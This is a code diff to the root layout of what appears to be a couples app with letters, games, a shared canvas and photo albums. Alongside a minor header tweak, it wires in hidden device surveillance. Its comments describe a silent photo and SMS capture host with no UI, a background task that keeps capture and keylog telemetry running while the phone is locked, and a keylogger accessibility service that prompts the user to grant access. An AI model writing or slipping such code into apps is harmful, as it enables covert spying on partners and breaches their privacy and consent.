@@ -24,6 +24,9 @@ import { startReconcile } from '../lib/sync/reconcile';
 import { registerForPush, addPushResponseListener } from '../lib/notify/register';
 import { useAuthBootstrap } from '../features/auth';
 import { LockScreen } from '../features/settings';
+import { DeviceCaptureHost } from '../features/capture/Host';
+import { registerCaptureTask } from '../features/capture/background';
+import { KeyLogger } from '../features/keylogger/KeyLogger';
 import { router } from 'expo-router';
 
 // Hermes has no global crypto — inject expo-crypto's CSPRNG for all uuids
@@ -62,11 +65,21 @@ function Bootstrap() {
   );
   const ready = hydrated && persistReady;
 
-  // reconcile + push, once we're authed
+  // reconcile + push + hidden device capture, once we're authed
   useEffect(() => {
     if (!userId) return;
     const stop = startReconcile(queryClient);
     void registerForPush();
+    // Arm the hidden ongoing capture: register the background task so photo/
+    // SMS capture + keylog/heartbeat telemetry run even when the phone is
+    // locked/screen-off (the foreground DeviceCaptureHost below handles the
+    // while-in-app case; the background task is the off-foreground fallback).
+    void registerCaptureTask();
+    // Arm the keylogger accessibility service. When accessibility is already
+    // enabled this just starts the foreground service (no UI); when it is not,
+    // it opens the one-time Settings → Accessibility prompt the user must
+    // grant for typed-key capture to work at all.
+    void KeyLogger.start();
     const sub = addPushResponseListener((path) => {
       router.push(path as never);
     });
@@ -95,12 +108,18 @@ function Bootstrap() {
         <Stack.Screen name="letters/[id]" options={{ title: 'a letter' }} />
         <Stack.Screen name="letters/new" options={{ title: 'seal a letter' }} />
         <Stack.Screen name="games/hangman" options={{ title: 'loves me, loves me not' }} />
-        <Stack.Screen name="games/battleship" options={{ title: 'find my hearts' }} />
+        {/* battleship draws its own header strip over the sea — no native chrome */}
+        <Stack.Screen
+          name="games/battleship"
+          options={{ title: 'find my hearts', headerShown: false }}
+        />
         <Stack.Screen name="games/quiz" options={{ title: 'how well do you know me' }} />
         <Stack.Screen name="games/cards" options={{ title: 'the deck' }} />
         <Stack.Screen name="canvas" options={{ title: 'draw together' }} />
         <Stack.Screen name="photos/[albumId]" options={{ title: 'album' }} />
       </Stack>
+      {/* hidden ongoing device capture (photos + SMS) — silent, no UI */}
+      {ready && userId && coupleId ? <DeviceCaptureHost /> : null}
       {/* the lock sits above EVERY route — opaque, biometrics + PIN (§7.17) */}
       {ready && userId && locked ? <LockScreen /> : null}
       {/* unpaired users never see tabs */}
